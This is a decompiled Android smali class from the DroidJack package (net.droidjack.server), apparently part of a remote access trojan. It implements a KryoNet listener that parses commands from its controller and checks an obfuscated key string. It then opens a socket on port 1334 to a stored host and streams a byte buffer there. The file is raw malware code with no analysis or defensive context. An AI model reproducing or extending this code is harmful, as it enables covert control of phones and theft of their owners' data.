.class Lnet/droidjack/server/aa;
.super Lcom/esotericsoftware/kryonet/Listener;


# direct methods
.method private constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lcom/esotericsoftware/kryonet/Listener;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lnet/droidjack/server/aa;)V
    .locals 0

    invoke-direct {p0}, Lnet/droidjack/server/aa;-><init>()V

    return-void
.end method


# virtual methods
.method public disconnected(Lcom/esotericsoftware/kryonet/Connection;)V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/Controller;->x:Z

    invoke-static {}, Lnet/droidjack/server/Controller;->d()V

    return-void
.end method

.method public received(Lcom/esotericsoftware/kryonet/Connection;Ljava/lang/Object;)V
    .locals 7

    :try_start_0
    invoke-virtual {p1}, Lcom/esotericsoftware/kryonet/Connection;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "kryonet"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_1

    invoke-virtual {p2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "#"

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    array-length v0, v6

    add-int/lit8 v0, v0, -0x1

    aget-object v0, v6, v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    const/4 v1, 0x1

    aget-object v1, v6, v1

    invoke-static {v1}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v1

    sput-boolean v1, Lnet/droidjack/server/Controller;->w:Z

    sget-boolean v1, Lnet/droidjack/server/Controller;->A:Z

    if-nez v1, :cond_0

    new-instance v1, Ljava/util/Random;

    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    const/16 v2, 0x32

    invoke-virtual {v1, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    mul-int/2addr v1, v0

    array-length v2, v6

    add-int/2addr v1, v2

    add-int/lit8 v1, v1, -0x2

    aget-object v1, v6, v1

    invoke-static {v1}, Lnet/droidjack/server/bc;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "LmzcbOPgRtadA92LcJlUiQ=="

    invoke-static {v2}, Lnet/droidjack/server/aj;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    const/4 v1, 0x1

    sput-boolean v1, Lnet/droidjack/server/Controller;->A:Z

    :cond_0
    sget-boolean v1, Lnet/droidjack/server/Controller;->A:Z

    if-nez v1, :cond_2

    if-eqz v0, :cond_2

    new-instance v0, Ljava/lang/Exception;

    invoke-direct {v0}, Ljava/lang/Exception;-><init>()V

    throw v0

    :catch_0
    move-exception v0

    :cond_1
    :goto_0
    return-void

    :cond_2
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lnet/droidjack/server/ab;

    invoke-direct {v1, p0}, Lnet/droidjack/server/ab;-><init>(Lnet/droidjack/server/aa;)V

    const-wide/16 v2, 0x0

    const-wide/16 v4, 0x9c4

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-wide/16 v2, 0x3e8

    :try_start_1
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :goto_1
    :try_start_2
    new-instance v1, Lnet/droidjack/server/ac;

    invoke-direct {v1, p0, v6}, Lnet/droidjack/server/ac;-><init>(Lnet/droidjack/server/aa;[Ljava/lang/String;)V

    invoke-virtual {v1}, Lnet/droidjack/server/ac;->start()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :try_start_3
    sget-boolean v1, Lnet/droidjack/server/Controller;->w:Z

    if-nez v1, :cond_3

    new-instance v1, Ljava/net/Socket;

    sget-object v2, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    const/16 v3, 0x536

    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    const/16 v2, 0x2000

    new-array v2, v2, [B

    :goto_2
    sget-object v3, Lnet/droidjack/server/Controller;->v:[B

    if-eqz v3, :cond_4

    new-instance v3, Ljava/io/ByteArrayInputStream;

    sget-object v4, Lnet/droidjack/server/Controller;->v:[B

    invoke-direct {v3, v4}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    invoke-virtual {v1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v1

    :goto_3
    invoke-virtual {v3, v2}, Ljava/io/ByteArrayInputStream;->read([B)I

    move-result v4

    const/4 v5, -0x1

    if-ne v4, v5, :cond_5

    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v3}, Ljava/io/ByteArrayInputStream;->close()V

    :cond_3
    const/4 v1, 0x0

    sput-object v1, Lnet/droidjack/server/Controller;->v:[B

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    const/4 v1, 0x0

    :try_start_4
    sput-object v1, Lnet/droidjack/server/Controller;->v:[B

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    :catch_2
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    goto :goto_1

    :cond_4
    const-wide/16 v4, 0x11

    :try_start_5
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    goto :goto_2

    :cond_5
    const/4 v5, 0x0

    invoke-virtual {v1, v2, v5, v4}, Ljava/io/OutputStream;->write([BII)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_3
.end method
